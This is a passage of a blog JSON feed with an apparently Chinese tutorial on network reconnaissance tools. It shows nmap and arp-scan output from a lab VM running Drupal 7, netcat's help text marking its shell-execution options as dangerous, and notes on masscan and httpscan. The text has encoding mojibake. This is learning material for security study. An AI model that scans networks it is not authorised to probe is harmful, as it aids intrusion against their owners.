number\">192.168</span>.234.129</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00040s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>MAC Address: 00:0C:29:02:FE:AE <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.234.254</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00071s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>MAC Address: 00:50:56:F6:24:83 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.234.134</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Host is up.</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Nmap done: <span class=\"token number\">256</span> IP addresses <span class=\"token punctuation\">(</span><span class=\"token number\">5</span> hosts up<span class=\"token punctuation\">)</span> scanned <span class=\"token keyword\">in</span> <span class=\"token number\">2.13</span> seconds</pre></td></tr></table></figure><p>ç”¨ arp-scan åŒç†</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>â””â”€<span class=\"token comment\"># arp-scan -l</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Interface: eth0, type: EN10MB, MAC: 00:0c:29:31:18:c8, IPv4: <span class=\"token number\">192.168</span>.234.134</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Starting arp-scan <span class=\"token number\">1.10</span>.0 with <span class=\"token number\">256</span> hosts <span class=\"token punctuation\">(</span>https://github.com/royhills/arp-scan<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">192.168</span>.234.1   00:50:56:c0:00:08       VMware, Inc.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">192.168</span>.234.2   00:50:56:e0:4c:0c       VMware, Inc.</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token number\">192.168</span>.234.129 00:0c:29:02:fe:ae       VMware, Inc.</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">192.168</span>.234.254 00:50:56:f6:24:83       VMware, Inc.</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">4</span> packets received by filter, <span class=\"token number\">0</span> packets dropped by kernel</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Ending arp-scan <span class=\"token number\">1.10</span>.0: <span class=\"token number\">256</span> hosts scanned <span class=\"token keyword\">in</span> <span class=\"token number\">2.310</span> seconds <span class=\"token punctuation\">(</span><span class=\"token number\">110.82</span> hosts/sec<span class=\"token punctuation\">)</span>.</pre></td></tr></table></figure><p>ç„¶åæ·±åº¦æ‰«æ</p>\n<details open>\n<summary><span class=\"pre-summary\">&nbsp;</span>ğŸ‘‡ç»“æœæœ‰ç‚¹é•¿ï¼Œç‚¹å‡»å±•å¼€é€æ¡è®²è§£</summary><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>â””â”€<span class=\"token comment\"># nmap -sV -A 192.168.234.129 </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Starting Nmap <span class=\"token number\">7.94</span> <span class=\"token punctuation\">(</span> https://nmap.org <span class=\"token punctuation\">)</span> at <span class=\"token number\">2024</span>-04-15 <span class=\"token number\">12</span>:19 EDT</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.234.129  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.0016s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Not shown: <span class=\"token number\">997</span> closed tcp ports <span class=\"token punctuation\">(</span>reset<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>PORT    STATE SERVICE VERSION</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">22</span>/tcp  <span class=\"token function\">open</span>  <span class=\"token function\">ssh</span>     OpenSSH <span class=\"token number\">6</span>.0p1 Debian <span class=\"token number\">4</span>+deb7u7 <span class=\"token punctuation\">(</span>protocol <span class=\"token number\">2.0</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\"># æœåŠ¡ç±»å‹ã€ç‰ˆæœ¬ï¼Œç³»ç»Ÿç‰ˆæœ¬ã€åè®®</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">|</span> ssh-hostkey:      <span class=\"token comment\"># å¯†é’¥ç±»å‹</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">1024</span> c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f <span class=\"token punctuation\">(</span>DSA<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">2048</span> <span class=\"token number\">11</span>:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 <span class=\"token punctuation\">(</span>RSA<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">|</span>_  <span class=\"token number\">256</span> 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 <span class=\"token punctuation\">(</span>ECDSA<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token number\">80</span>/tcp  <span class=\"token function\">open</span>  http    Apache httpd <span class=\"token number\">2.2</span>.22 <span class=\"token variable\"><span class=\"token punctuation\">((</span>Debian<span class=\"token punctuation\">))</span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token operator\">|</span>_http-title: Welcome to Drupal Site <span class=\"token operator\">|</span> Drupal Site</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">|</span>_http-server-header: Apache/2.2.22 <span class=\"token punctuation\">(</span>Debian<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># apache æœåŠ¡å™¨ä»¥åŠç‰ˆæœ¬</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">|</span> http-robots.txt: <span class=\"token number\">36</span> disallowed entries <span class=\"token punctuation\">(</span><span class=\"token number\">15</span> shown<span class=\"token punctuation\">)</span>   <span class=\"token comment\"># robots.txt çš„ disable è·¯å¾„</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token operator\">|</span> /includes/ /misc/ /modules/ /profiles/ /scripts/ </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">|</span> /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token operator\">|</span> /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token operator\">|</span>_/LICENSE.txt /MAINTAINERS.txt</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token operator\">|</span>_http-generator: Drupal <span class=\"token number\">7</span> <span class=\"token punctuation\">(</span>http://drupal.org<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># ç½‘å€ä½¿ç”¨çš„ cms ä»¥åŠç‰ˆæœ¬ï¼Œè¿˜æœ‰å®˜æ–¹ç½‘å€</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token number\">111</span>/tcp <span class=\"token function\">open</span>  rpcbind <span class=\"token number\">2</span>-4 <span class=\"token punctuation\">(</span>RPC <span class=\"token comment\">#100000)  # ä¸»æœºå¼€æ”¾ 111 ç«¯å£</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token operator\">|</span> rpcinfo:       <span class=\"token comment\"># æ­£åœ¨è¿è¡Œ rpcbind æœåŠ¡   ï¼ˆè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token operator\">|</span>   program version    port/proto  <span class=\"token function\">service</span>   <span class=\"token comment\"># æ­£åœ¨è¿è¡Œçš„ RPC ç¨‹åºå’Œç«¯å£</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">100000</span>  <span class=\"token number\">2,3</span>,4        <span class=\"token number\">111</span>/tcp   rpcbind</pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">100000</span>  <span class=\"token number\">2,3</span>,4        <span class=\"token number\">111</span>/udp   rpcbind</pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">100000</span>  <span class=\"token number\">3,4</span>          <span class=\"token number\">111</span>/tcp6  rpcbind</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">100000</span>  <span class=\"token number\">3,4</span>          <span class=\"token number\">111</span>/udp6  rpcbind</pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">100024</span>  <span class=\"token number\">1</span>          <span class=\"token number\">39478</span>/udp   status</pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">100024</span>  <span class=\"token number\">1</span>          <span class=\"token number\">40676</span>/tcp   status</pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">100024</span>  <span class=\"token number\">1</span>          <span class=\"token number\">42791</span>/tcp6  status</pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token operator\">|</span>_  <span class=\"token number\">100024</span>  <span class=\"token number\">1</span>          <span class=\"token number\">52968</span>/udp6  status</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>MAC Address: 00:0C:29:02:FE:AE <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>Device type: general purpose</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>Running: Linux <span class=\"token number\">3</span>.X   <span class=\"token comment\"># ç³»ç»Ÿç±»å‹å’Œå†…æ ¸ç‰ˆæœ¬</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>OS CPE: cpe:/o:linux:linux_kernel:3</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>OS details: Linux <span class=\"token number\">3.2</span> - <span class=\"token number\">3.16</span>   <span class=\"token comment\"># å†…æ ¸ç‰ˆæœ¬èŒƒå›´</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>Network Distance: <span class=\"token number\">1</span> hop   <span class=\"token comment\"># æŒ‡ç¤ºè®¾å¤‡ä¸æ‰«æå™¨ä¹‹é—´çš„ç½‘ç»œè·ç¦»ä¸º 1 è·³ï¼Œè¡¨ç¤ºå®ƒä»¬åœ¨åŒä¸€ä¸ªå±€åŸŸç½‘ä¸­ã€‚</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>Service Info: OS: Linux<span class=\"token punctuation\">;</span> CPE: cpe:/o:linux:linux_kernel</pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>TRACEROUTE</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>HOP RTT     ADDRESS</pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token number\">1</span>   <span class=\"token number\">1.59</span> ms <span class=\"token number\">192.168</span>.234.129</pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>Nmap done: <span class=\"token number\">1</span> IP address <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token function\">host</span> up<span class=\"token punctuation\">)</span> scanned <span class=\"token keyword\">in</span> <span class=\"token number\">25.10</span> seconds</pre></td></tr></table></figure></details>\n<p>ä¸¤ä¸ªå‘½ä»¤è¿˜ä¸è¶³ä»¥å±•ç° nmap çš„å¼ºå¤§ï¼Œåœ¨åé¢ä¼šæ·±å…¥å­¦ä¹ </p>\n<h3 id=\"å®Œæ•´ä½¿ç”¨è¯´æ˜\"><a class=\"anchor\" href=\"#å®Œæ•´ä½¿ç”¨è¯´æ˜\">#</a> å®Œæ•´ä½¿ç”¨è¯´æ˜</h3>\n<blockquote>\n<p>æ•™ç¨‹å†å¥½ç»ˆå½’ä¸å¦‚å®˜æ–¹æ–‡æ¡£</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>â””â”€<span class=\"token comment\"># nc -h                 </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">[</span>v1.10-47<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>è¿æ¥:   <span class=\"token function\">nc</span> <span class=\"token punctuation\">[</span>-options<span class=\"token punctuation\">]</span> <span class=\"token function\">hostname</span> port<span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>ports<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">..</span>. </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>ç›‘å¬å…¥ç«™:     <span class=\"token function\">nc</span> <span class=\"token parameter variable\">-l</span> <span class=\"token parameter variable\">-p</span> port <span class=\"token punctuation\">[</span>-options<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>hostname<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>port<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>options:</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token parameter variable\">-c</span> shell commands       å‘½ä»¤ä¸ºâ€œ-eâ€ï¼›prog ç¨‹åºé‡å®šå‘ï¼Œä½¿ç”¨ /bin/sh æ‰§è¡Œ <span class=\"token punctuation\">[</span>å±é™©ï¼ï¼<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token parameter variable\">-e</span> filename             è¿æ¥åæ‰§è¡Œçš„ç¨‹åº<span class=\"token punctuation\">[</span>å±é™©ï¼ï¼<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token parameter variable\">-b</span>                      å…è®¸å¹¿æ’­</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token parameter variable\">-g</span> gateway              ç½‘å…³æºè·¯ç”±è·³è·ƒç‚¹ï¼Œæœ€å¤š <span class=\"token number\">8</span> ä¸ª</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token parameter variable\">-G</span> num                  æºè·¯ç”±æŒ‡é’ˆï¼š4, <span class=\"token number\">8</span>, <span class=\"token number\">12</span>, <span class=\"token punctuation\">..</span>.</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token parameter variable\">-h</span>                      this cruft  è¿™ä¸ªåºŸè¯,å°±æ˜¯å¸®åŠ©</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token parameter variable\">-i</span> secs                 å‘é€çº¿è·¯ã€æ‰«æç«¯å£çš„å»¶è¿Ÿé—´éš”</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token parameter variable\">-k</span>                      è®¾ç½®å¥—æ¥å­—ä¸Šçš„ keepalive é€‰é¡¹</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token parameter variable\">-l</span>                      ç›‘å¬æ¨¡å¼ï¼Œç”¨äºå…¥ç«™è¿æ¥</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token parameter variable\">-n</span>                      ä»…æ•°å­— IP åœ°å€ï¼Œæ—  DNS</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token parameter variable\">-o</span> <span class=\"token function\">file</span>                 æ–‡ä»¶åå…­è¿›åˆ¶è½¬å‚¨æµé‡</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token parameter variable\">-p</span> port                 æœ¬åœ°ç«¯å£å·</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token parameter variable\">-r</span>                      éšæœºåŒ–æœ¬åœ°å’Œè¿œç¨‹ç«¯å£</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token parameter variable\">-q</span> secs                 åœ¨ stdin ä¸Šçš„ EOF å’Œå»¶è¿Ÿç§’åé€€å‡º</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token parameter variable\">-s</span> addr                 æœ¬åœ°æºåœ°å€</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token parameter variable\">-T</span> tos                  è®¾ç½®æœåŠ¡ç±»å‹</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token parameter variable\">-t</span>                      åº”ç­”TELNETåå•†</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token parameter variable\">-u</span>                      UDPæ¨¡å¼</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token parameter variable\">-v</span>                      verbose <span class=\"token punctuation\">[</span>ä½¿ç”¨ä¸¤æ¬¡ä»¥æ›´åŠ è¯¦ç»†<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token parameter variable\">-w</span> secs                 è¿æ¥å’Œæœ€ç»ˆç½‘ç»œè¯»å–çš„è¶…æ—¶æ—¶é—´</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token parameter variable\">-C</span>                      å‘é€ CRLF ä½œä¸ºè¡Œç»“æŸç¬¦</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token parameter variable\">-z</span>                      é›¶ I/O æ¨¡å¼ <span class=\"token punctuation\">[</span>ç”¨äºæ‰«æ<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>port numbers can be individual or ranges: lo-hi <span class=\"token punctuation\">[</span>inclusive<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>hyphens <span class=\"token keyword\">in</span> port names must be backslash escaped <span class=\"token punctuation\">(</span>e.g. <span class=\"token string\">'ftp\\-data'</span><span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\"># ç«¯å£å·å¯ä»¥æ˜¯å•ä¸ªç«¯å£å·ï¼Œä¹Ÿå¯ä»¥æ˜¯èŒƒå›´ï¼šlo-hi [åŒ…å«]ï¼›</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># ç«¯å£åç§°ä¸­çš„è¿å­—ç¬¦å¿…é¡»ä½¿ç”¨åæ–œæ è½¬ä¹‰ï¼ˆä¾‹å¦‚ â€œftp\\-dataâ€ï¼‰ã€‚</span></pre></td></tr></table></figure><h1 id=\"åè¯\"><a class=\"anchor\" href=\"#åè¯\">#</a> åè¯</h1>\n<p>ncã€netcatã€nmapâ€¦â€¦kali è¿˜æœ‰å¤šå°‘ä¸å¯ä¼°é‡çš„å·¥å…·ç­‰ç€è‡ªå·±å‘æ˜</p>\n<h2 id=\"é¢˜å¤–è¯1arp-scan\"><a class=\"anchor\" href=\"#é¢˜å¤–è¯1arp-scan\">#</a> é¢˜å¤–è¯ 1ï¼š<a href=\"https://gitcode.com/royhills/arp-scan?utm_source=artical_gitcode\">arp-scan</a></h2>\n<p><strong>ä»€ä¹ˆæ˜¯ ARP</strong><br />\n åœ°å€è§£æåè®®ï¼ˆAddress Resolution Protocolï¼‰ï¼Œå…¶åŸºæœ¬åŠŸèƒ½ä¸ºé€šè¿‡ç›®æ ‡è®¾å¤‡çš„ IP åœ°å€ï¼ŒæŸ¥è¯¢ç›®æ ‡è®¾å¤‡çš„ MAC åœ°å€ï¼Œä»¥ä¿è¯é€šä¿¡çš„é¡ºåˆ©è¿›è¡Œã€‚ å®ƒæ˜¯ IPv4 ä¸­ç½‘ç»œå±‚å¿…ä¸å¯å°‘çš„åè®®ï¼Œæ˜¯æ ¹æ® IP åœ°å€è·å¾—ç‰©ç†åœ°å€ MAC çš„ä¸€ä¸ª TCP/IP åè®®ã€‚é€šè¿‡ ARPï¼Œåœ¨å±€åŸŸç½‘å¯ä»¥å¾ˆå®¹æ˜“æ„æˆä¸€ä¸ª ARP æ¬ºéª—ï¼Œä»è€Œå¾—åˆ°æœ‰ç”¨æ•°æ®ä¿¡æ¯ã€‚</p>\n<table>\n<thead>\n<tr>\n<th>å‚æ•°</th>\n<th>ä½œä¸š</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-v</td>\n<td>æ˜¾ç¤ºè¯¦ç»†çš„è¿›åº¦æ¶ˆæ¯</td>\n</tr>\n<tr>\n<td>-V</td>\n<td>æ˜¾ç¤ºç‰ˆæœ¬</td>\n</tr>\n<tr>\n<td>-i</td>\n<td>ä½¿ç”¨ç½‘ç»œæ¥å£</td>\n</tr>\n<tr>\n<td>-f</td>\n<td>ä»æ–‡ä»¶ä¸­è¯»å–ä¸»æœºåæˆ–åœ°å€</td>\n</tr>\n<tr>\n<td>-I</td>\n<td>ä»æ¥å£åœ°å€å’Œç½‘ç»œæ©ç ï¼ˆåŒ…æ‹¬ç½‘ç»œå’Œå¹¿æ’­ï¼‰ç”Ÿæˆåˆ—è¡¨</td>\n</tr>\n</tbody>\n</table>\n<p>å¸¸ç”¨</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>arp-scan <span class=\"token parameter variable\">--localnet</span>   <span class=\"token comment\"># å‘é€ ARP è¯·æ±‚æ‰«ææœ¬åœ°ç½‘ç»œä¸­çš„æ´»åŠ¨ä¸»æœºï¼Œå¹¶æ˜¾ç¤ºå®ƒä»¬çš„ MAC åœ°å€å’Œ IP åœ°å€ã€‚</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>arp-scan <span class=\"token parameter variable\">-I</span> eth0 <span class=\"token parameter variable\">--rtt</span> <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span>  <span class=\"token comment\"># åœ¨æŒ‡å®šç½‘ç»œæ¥å£ï¼ˆä¾‹å¦‚ eth0ï¼‰ä¸Šæ‰§è¡Œ ARP æ‰«æï¼ŒåŒæ—¶æ˜¾ç¤ºæ¯ä¸ªä¸»æœºçš„å¾€è¿”æ—¶é—´ï¼ˆRTTï¼‰</span></pre></td></tr></table></figure><p><a href=\"https://cn.linuxos.info/command/arp-scan\">arp-scan - å‚è€ƒæ‰‹å†Œã€é€‰é¡¹ã€å‘½ä»¤ç¤ºä¾‹ (linuxos.info)</a></p>\n<h2 id=\"é¢˜å¤–è¯2masscan\"><a class=\"anchor\" href=\"#é¢˜å¤–è¯2masscan\">#</a> é¢˜å¤–è¯ 2ï¼š<a href=\"http://t.csdnimg.cn/2uU8h\">Masscan</a></h2>\n<blockquote>\n<p>Masscan æ˜¯ä¸€æ¬¾å¿«é€Ÿã€é«˜æ€§èƒ½çš„å¼€æºç«¯å£æ‰«æå·¥å…·ï¼Œæ—¨åœ¨ä»¥æé«˜çš„é€Ÿåº¦æ‰«ææ•´ä¸ªäº’è”ç½‘çš„ IPv4 åœ°å€ç©ºé—´ã€‚å®ƒçš„è®¾è®¡ç›®æ ‡æ˜¯å¿«é€Ÿã€çµæ´»ä¸”é€‚ç”¨äºå¤§è§„æ¨¡çš„ç«¯å£æ‰«æä»»åŠ¡ã€‚</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>masscan <span class=\"token operator\">&lt;</span>IPæˆ–ç½‘æ®µ<span class=\"token operator\">></span> <span class=\"token parameter variable\">-p</span> <span class=\"token operator\">&lt;</span>ç«¯å£å·æˆ–ç«¯å£èŒƒå›´<span class=\"token operator\">></span> <span class=\"token parameter variable\">--rate</span> <span class=\"token operator\">&lt;</span>æ¯ç§’å‘é€æ•°æ®åŒ…æ•°é‡<span class=\"token operator\">></span>ï¼ˆä¸€èˆ¬åä¸‡æˆ–ä¸€ç™¾ä¸‡ï¼‰</pre></td></tr></table></figure><p>å…¶ä»–å‚æ•°è¯¦è§£ï¼š</p>\n<table>\n<thead>\n<tr>\n<th>é€‰é¡¹</th>\n<th>ä½œç”¨</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>--excludefile filename</td>\n<td>æ’é™¤æ–‡ä»¶ä¸­çš„é€‰é¡¹</td>\n</tr>\n<tr>\n<td>-oX filename</td>\n<td>è¾“å‡ºåˆ° filename çš„ XML</td>\n</tr>\n<tr>\n<td>-oG filename</td>\n<td>è¾“å‡ºåˆ° filename åœ¨çš„ grepable æ ¼å¼</td>\n</tr>\n<tr>\n<td>-oJ filename</td>\n<td>è¾“å‡ºåˆ° filename åœ¨ JSON æ ¼å¼ã€‚</td>\n</tr>\n</tbody>\n</table>\n<p>ä¸»æ‰“ä¸€ä¸ªå¿«æ·è¿…é€Ÿ</p>\n<h2 id=\"é¢˜å¤–è¯3httpscan\"><a class=\"anchor\" href=\"#é¢˜å¤–è¯3httpscan\">#</a> é¢˜å¤–è¯ 3ï¼š<a href=\"https://github.com/zer0h/httpscan\">httpscan</a></h2>\n<p><a href=\"https://github.com/zer0h/httpscan\">é¡¹ç›®åœ°å€</a></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>httpscan.py <span class=\"token number\">192.168</span>.0.0/24 â€“t <span class=\"token number\">10</span></pre></td></tr></table></figure><blockquote>\n<p>httpscan æ˜¯ä¸€ä¸ªæ‰«ææŒ‡å®š CIDR ç½‘æ®µçš„ Web ä¸»æœºçš„å°å·¥å…·ã€‚å’Œç«¯å£æ‰«æå™¨ä¸ä¸€æ ·ï¼Œhttpscan æ˜¯ä»¥çˆ¬è™«çš„æ–¹å¼è¿›è¡Œ Web ä¸»æœºå‘ç°ï¼Œå› æ­¤ç›¸å¯¹æ¥è¯´ä¸å®¹æ˜“è¢«é˜²ç«å¢™æ‹¦æˆªã€‚</p>\n</blockquote>\n<h1 id=\"å‚è€ƒé“¾æ¥\"><a class=\"anchor\" href=\"#å‚è€ƒé“¾æ¥\">#</a> å‚è€ƒé“¾æ¥ï¼š</h1>\n<p><a href=\"https://nmap.org/man/zh/index.html\">å®˜æ–¹æ–‡æ¡£ï¼š</a><a href=\"https://nmap.org/man/zh/index.html\">https://nmap.org/man/zh/index.html</a></p>\n<p><a href=\"http://t.csdnimg.cn/iN9Wc\">http://t.csdnimg.cn/iN9Wc</a></p>\n<p><a href=\"http://t.csdnimg.cn/2uU8h\">http://t.csdnimg.cn/2uU8h</a></p>\n<p><a href=\"https://gitcode.com/royhills/arp-scan?utm_source=artical_gitcode\">https://gitcode.com/royhills/arp-scan</a></p>\n",
            "tags": [
                "Penetration Test",
                "Attack and Defence",
                "kali tools",
                "Penetration Test"
            ]
        },
        {
            "id": "https://ctf-learner.github.io/post/AWD%E5%88%9D%E4%BD%93%E9%AA%8C/",
            "url": "https://ctf-learner.github.io/post/AWD%E5%88%9D%E4%BD%93%E9%AA%8C/",
            "title": "AWDåˆä½“éªŒ",
            "date_published": "2024-04-14T04:40:23.000Z",
